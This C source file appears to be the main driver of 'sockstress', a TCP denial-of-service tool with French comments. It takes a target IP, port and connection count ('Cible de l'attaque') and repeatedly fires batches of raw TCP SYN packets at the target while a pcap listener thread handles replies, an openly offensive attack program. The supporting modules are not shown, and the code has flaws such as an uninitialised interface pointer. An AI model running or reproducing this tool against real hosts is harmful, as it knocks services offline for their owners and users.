#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>

#include <string.h>

#include <pthread.h>

#include "tcpcreate.h"
#include "listen.h"
#include "sockstress.h"

int fin = 0;

uint32_t addr_stoh(char *s)
{
  uint8_t addre[4];
  uint32_t addr;
  int d=0 , f=0;
  char nombre[4];
  int i;

  // On parcours les 4 entiers de l'adresse
  for (i=3;i>=0;--i)
    {
      // On recherche la position du point ou de la fin
      for (f=d ; f<strlen(s) && s[f]!='.' ; ++f);

      // Test pour éviter les buffer overflow
      if (f-d>4)
	return 0;
      
      // On copie 3 caracteres pour être sur d'ecraser le nombre precedent
      // Tant pis si on met un point car atoi s'arretera a son niveau
      memcpy(nombre,s+d,3);
      addre[i]=atoi(nombre);
      d=f+1;
    }

  memcpy(&addr, addre, 4);

  return (uint32_t) addr;

}

void print_usage()
{
  printf("sockstress [options]\n"
"\t-d IP\t Cible de l'attaque\n"
"\t-p port\t Port utilise\n"
"\t-i interface\t Interface pour l'envoi des paquets\n"
"\t-r requete\t Requete envoye apres l'ouverture de la connexion\n"
"\t-t timeout\t Duree apres laquelle on renvoi de nouvelle connections\n"
"\t-n nombre\t Nombre de connections a etablir\n");
}


int main(int argc, char **argv)
{
  pthread_t thListen;

  uint32_t destination =  0x0;
  uint16_t port = 0;
  unsigned int timeout = 0;
  unsigned int nombre_connections = 200;
  char *interface;

  // 10.162.114.132 0x0aa27284;
  // 10.162.112.22  0x0aa27017;
  struct listendata thListenData;

  int i;
  extern char *optarg;

  thListenData.request = NULL;

  // On récupère les arguments
  while ((i=getopt(argc, argv, "d:p:r:t:n:hi:")) != -1)
    {
      switch(i)
	{
	case 'd': printf("Adresse destination: %s\n", optarg);
	  destination = addr_stoh(optarg);
	  if (destination == 0x0) { printf("Mauvaise addresse IP\n");return EXIT_FAILURE;}
	  printf("%lx\n",(long unsigned int) destination);
	  thListenData.stringdestination = optarg;
	  break;
	case 'p': printf("Port: %s\n",optarg);
	  port = (uint16_t) atoi(optarg);
	  if (port == 0) { printf("Mauvais numéro de port\n");return EXIT_FAILURE;}
	  break;
	case 'r':
	  thListenData.request = optarg;
	  break;
	case 't':
	  timeout = atoi(optarg);
	  break;
	case 'n':
	  nombre_connections = atoi(optarg);
	  break;
	case 'i':
	  interface = optarg;
	  break;
	case '?':
	case 'h':
	  print_usage();
	  return EXIT_SUCCESS;
	  break;
	}

    }

  if (interface == NULL)
    init_packet_creation("eth0");
  else
    init_packet_creation(interface);

  if (thListenData.request == NULL)
    thListenData.request = "vide";

  if (destination == 0x0)
    {
      printf("Aucune cible n'a ete specifiee\n\n");
      print_usage();
      return EXIT_SUCCESS;
    }

  if (port == 0)
    {
      printf("Aucun port n'a ete specifie\n\n");
      print_usage();
      return EXIT_SUCCESS;
    }

  thListenData.port = port;
  thListenData.destination = destination;
  thListenData.fin = &fin;
  pthread_create(&thListen, 0, thread_listen, &thListenData);

  // On attend un peu le temps que pcap soit démaré
  sleep(1);

  // On initialise les connections
  while (fin == 0)
    {
      for (i=0; i<nombre_connections; ++i)
	send_tcp_syn(htonl(destination), port);

      printf("%d connections initialized\n",nombre_connections);

      if (timeout != 0)
	sleep(timeout);
      else
	break;
    }
  

  pthread_join(thListen,NULL);

  close_packet_creation();

  return EXIT_SUCCESS;
}
